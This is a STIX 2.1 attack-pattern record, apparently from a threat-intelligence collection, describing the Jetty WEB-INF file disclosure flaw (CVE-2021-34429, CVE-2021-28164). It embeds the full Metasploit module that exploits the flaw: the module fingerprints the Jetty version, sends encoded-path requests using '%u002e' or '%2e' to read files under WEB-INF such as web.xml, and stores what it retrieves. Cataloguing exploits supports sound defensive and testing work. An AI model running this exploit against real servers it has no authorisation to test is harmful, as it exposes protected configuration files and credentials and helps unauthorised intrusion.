{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23d01dc5-19d2-416b-a594-8344d23249cd",
    "created": "2024-08-14T16:32:52.64103Z",
    "modified": "2024-08-14T16:32:52.641034Z",
    "name": "Jetty WEB-INF File Disclosure",
    "description": " Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access protected files in the WEB-INF folder. Versions effected are: 9.4.37.v20210219, 9.4.38.v20210224 and 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5. Exploitation can obtain any file in the WEB-INF folder, but web.xml is most likely to have information of value. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/jetty_web_inf_disclosure.rb",
            "external_id": "jetty_web_inf_disclosure.rb"
        },
        {
            "source_name": "cangqingzhe",
            "external_id": "#CVE-2021-34429"
        },
        {
            "source_name": "lachlanroberts<lachlan@webtide.com>",
            "external_id": "#CVE-2021-34429"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ColdFusionX/CVE-2021-34429"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-34429"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-28164"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jetty WEB-INF File Disclosure',\n        'Description' => %q{\n          Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access\n          protected files in the WEB-INF folder. Versions effected are:\n          9.4.37.v20210219, 9.4.38.v20210224 and 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.\n          Exploitation can obtain any file in the WEB-INF folder, but web.xml is most likely\n          to have information of value.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Mayank Deshmukh', # EDB module\n          'cangqingzhe', # CVE-2021-34429\n          'lachlan roberts <lachlan@webtide.com>', # CVE-2021-34429\n          'charlesk40' # CVE-2021-28164\n        ],\n        'References' => [\n          [ 'EDB', '50438' ],\n          [ 'EDB', '50478' ],\n          [ 'URL', 'https://github.com/ColdFusionX/CVE-2021-34429' ],\n          [ 'URL', 'https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm' ], # CVE-2021-34429\n          [ 'URL', 'https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5' ], # CVE-2021-28164\n          [ 'CVE', '2021-34429' ],\n          [ 'CVE', '2021-28164' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'DisclosureDate' => '2021-07-15',\n        'Actions' => [\n          [ 'READ_FILE', { 'Description' => 'Read file on the remote server from WEB-INF folder' } ],\n        ],\n        'DefaultAction' => 'READ_FILE'\n      )\n    )\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('FILE', [false, 'File in WEB-INF to retrieve', 'web.xml']),\n      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-34429', ['CVE-2021-34429', 'CVE-2021-28164']])\n    ])\n  end\n\n  def check\n    res = send_request_cgi('uri' => '/')\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Safe(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n    return Exploit::CheckCode::Safe(\"#{peer} - No Server header found\") unless res.headers['Server']\n    unless /Jetty\\((?<version>[^)]+)\\)/ =~ res.headers['Server']\n      return Exploit::CheckCode::Safe(\"#{peer} - Unable to detect Jetty version from server header: #{res.headers['Server']}\")\n    end\n\n    vprint_status(\"Found version: #{version}\")\n    version = Rex::Version.new(version)\n\n    if version == Rex::Version.new('9.4.37.v20210219') || version == Rex::Version.new('9.4.38.v20210224')\n      print_good(\"#{version} vulnerable to CVE-2021-28164\")\n      return Exploit::CheckCode::Detected\n    elsif version.between?(Rex::Version.new('9.4.37'), Rex::Version.new('9.4.43')) ||\n          version.between?(Rex::Version.new('10.0.1'), Rex::Version.new('10.0.6')) ||\n          version.between?(Rex::Version.new('11.0.1'), Rex::Version.new('11.0.6'))\n      print_good(\"#{version} vulnerable to CVE-2021-34429\")\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe('Server not vulnerable')\n  end\n\n  def pick_payload\n    case datastore['CVE']\n    when 'CVE-2021-34429'\n      payload = '%u002e'\n    when 'CVE-2021-28164'\n      payload = '%2e'\n    end\n\n    payload\n  end\n\n  def run\n    res = send_request_cgi('uri' => \"/#{pick_payload}/WEB-INF/#{datastore['FILE']}\")\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n    path = store_loot(\"jetty.#{datastore['FILE']}\", 'text/plain', target_host, res.body, datastore['FILE'], 'Jetty WEB-INF File')\n    print_good(\"File stored to #{path}\")\n    print_good(res.body)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-07-15"
}